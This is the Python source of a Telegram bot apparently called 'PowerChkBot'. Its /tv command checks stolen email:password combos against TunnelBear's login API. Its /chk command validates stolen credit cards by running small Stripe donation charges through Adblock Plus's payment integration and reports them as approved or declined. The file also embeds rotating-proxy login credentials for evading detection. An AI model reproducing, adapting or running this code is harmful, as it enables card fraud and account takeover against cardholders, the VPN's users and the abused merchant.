import logging
import os
import requests
import time
import string
import random

from aiogram import Bot, Dispatcher, executor, types

ENV = bool(os.environ.get('ENV', True))
TOKEN = os.environ.get("TOKEN", None)
BLACKLISTED = os.environ.get("BLACKLISTED", None) 
PREFIX = "!/"

# Configure logging
logging.basicConfig(level=logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)

###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED

proxy = {
    "http": "http://deplaobr-rotate:ocjxpp5iucgk@p.webshare.io:80/",
    "https": "http://deplaobr-rotate:ocjxpp5iucgk@p.webshare.io:80/",
} 

session = requests.session()

# session.proxies = proxy #UNCOMMENT IT AFTER PROXIES

#random str GEN FOR EMAIL
N = 10
rnd = ''.join(random.choices(string.ascii_lowercase +
                                string.digits, k = N))


@dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply(
        "Hello, type /cmds for see all comands\nBot by: @EdwinGGx 🐧"
    )

@dp.message_handler(commands=['cmds'], commands_prefix=PREFIX)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply(
        "All comands:\n/start\n/cmds\n/chk <b>= check your CC's</b>\n/tv <b>= check your hits</b>\n<b>Bot by: @EdwinGGx 🐧</b>\n\n<b>🟢-PowerChkBot-🟢</b>"
    )
    

@dp.message_handler(commands=['tv'], commands_prefix=PREFIX)
async def tv(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    ac = message.text[len('/tv '):]
    splitter = ac.split(':')
    email = splitter[0]
    password = splitter[1]
    if not ac:
        return await message.reply(
            "<code>Send acc /tv email:pass.</code>"
        )
    payload = {
        "username": email,
        "password": password,
        "withUserDetails": "true",
        "v": "web-1.0"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    r = session.post("https://prod-api-core.tunnelbear.com/core/web/api/login",
                     data=payload, headers=headers)
    toc = time.perf_counter()
    
    # capture ac details
    if "Access denied" in r.text:
        await message.reply(f"""
<b>Combo ➻ </b> <code>{ac}</code>
<b>Stado ➻ </b> Wrong Details! ㊙️
<b>Time ➻ <b>{toc - tic:0.4f}</b>(s)
<b>Checked by: </b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot by: @EdwinGGx 🐧</b>
\n
<b>🟢-PowerChkBot-🟢</b>
""")
    elif "PASS" in r.text:
        res = r.json()
        await message.reply(f"""
<b>Combo ➻ </b> <code>{ac}</code>
<b>Stado ➻ </b> Correct Details! 💹
<b>Time ➻ <b>{toc - tic:0.4f}</b>(s)
<b>Checked by: </b>➟ <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot by: @EdwinGGx 🐧</b>
\n
<b>🟢-PowerChkBot-🟢</b>
""")
    else:
        await message.reply("Error ㊙️: REQ failed")
        
    
@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    tic = time.perf_counter()
    await message.answer_chat_action("typing")
    cc = message.text[len('/chk '):]
    splitter = cc.split('|')
    ccn = splitter[0]
    mm = splitter[1]
    yy = splitter[2]
    cvv = splitter[3]
    email = f"{str(rnd)}@gmail.com"
    if not cc:
        return await message.reply(
            "<code>Send Card /chk cc|mm|yy|cvv.</code>"
        )   
    BIN = cc[:6]
    if BIN in BLACKLISTED:
        return await message.reply(
            "<b>BLACKLISTED BIN</b>"
            )
    # get guid muid sid
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    s = session.post("https://m.stripe.com/6",
                     headers=headers)
    r = s.json()
    Guid = r["guid"]
    Muid = r["muid"]
    Sid = r["sid"]
    
    # now 1 req
    payload = {
      "lang": "en",
      "type": "donation",
      "currency": "USD",
      "amount": "5",
      "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
      "currencySign": "$"
    }
    
    head = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "*/*",
      "Origin": "https://adblockplus.org",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://adblockplus.org/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    re = session.post("https://new-integration.adblockplus.org/",
                     data=payload, headers=head)
    client = re.text
    pi = client[0:27]
    
    #hmm
    load = {
      "receipt_email": email,
      "payment_method_data[type]": "card",
      "payment_method_data[billing_details][email]": email,
      "payment_method_data[card][number]": ccn,
      "payment_method_data[card][cvc]": cvv,
      "payment_method_data[card][exp_month]": mm,
      "payment_method_data[card][exp_year]": yy,
      "payment_method_data[guid]": Guid,
      "payment_method_data[muid]": Muid,
      "payment_method_data[sid]": Sid,
      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
      "payment_method_data[referrer]": "https://adblockplus.org/",
      "expected_payment_method_type": "card",
      "use_stripe_sdk": "true",
      "webauthn_uvpa_available": "true",
      "spc_eligible": "false",
      "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
      "client_secret": client
    }
    
    header = {
      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
      "Content-Type": "application/x-www-form-urlencoded",
      "Accept": "application/json",
      "Origin": "https://js.stripe.com",
      "Referer": "https://js.stripe.com/",
      "Accept-Language": "en-US,en;q=0.9"
    }
    
    rx = session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm",
                     data=load, headers=header)
    res = rx.json()
    msg = res["error"]["message"]
    toc = time.perf_counter()
    if "incorrect_cvc" in rx.text:
        await message.reply(f"""
<b>CC ➻</b> <code>{cc}</code>
<b>Status ➻</b> Aprobada! 💹
<b>Result ➻</b> CCN MATCH 🈺
<b>Gateway ➻</b> KLeticia 🈳
<b>⇀⇀⇀⇀ D  E  T  A  I  L  S ↼↼↼↼</b>
<b>Bin ➻<b> <code>{BIN}<code>
<b>Response ➻</b> {msg}
<b>Time ➻ </b> <code>{toc - tic:0.4f}</code>(s)
<b>Check by ➻</b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot by: @EdwinGGx 🐧</b>
\n
<b>🟢-PowerChkBot-🟢</b>
""")
    elif "Unrecognized request URL" in rx.text:
        await message.reply("[UPDATE] PROXIES ERROR")
    elif rx.status_code == 200:
        await message.reply(f"""
<b>CC ➻</b> <code>{cc}</code>
<b>Status ➻</b> Aprobada! 💹
<b>Result ➻</b> CCV MATCH 🈺
<b>Gateway ➻</b> KLeticia<3 🈳
<b>⇀⇀⇀⇀ D  E  T  A  I  L  S ↼↼↼↼</b>
<b>Bin ➻<b> <code>{BIN}<code>
<b>Response ➻</b> {msg}
<b>Time ➻ </b> <code>{toc - tic:0.4f}</code>(s)
<b>Check by ➻</b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot by: @EdwinGGx 🐧</b>
\n
<b>🟢-PowerChkBot-🟢</b>
""")
    else:
        await message.reply(f"""
<b>CC ➻</b> <code>{cc}</code>
<b>Status ➻</b> Rechazada! ㊙️
<b>Result ➻</b> DECLINE 🈺
<b>Gateway ➻</b> Dueña 🔲
<b>⇀⇀⇀⇀ D  E  T  A  I  L  S ↼↼↼↼</b>
<b>Bin ➻<b> <code>{BIN}<code>
<b>Response ➻</b> {msg}
<b>Time ➻ </b> <code>{toc - tic:0.4f}</code>(s)
<b>Check by ➻</b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>
<b>Bot by: @EdwinGGx 🐧</b>
\n
<b>🟢-PowerChkBot-🟢</b>
""")  
    
    
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
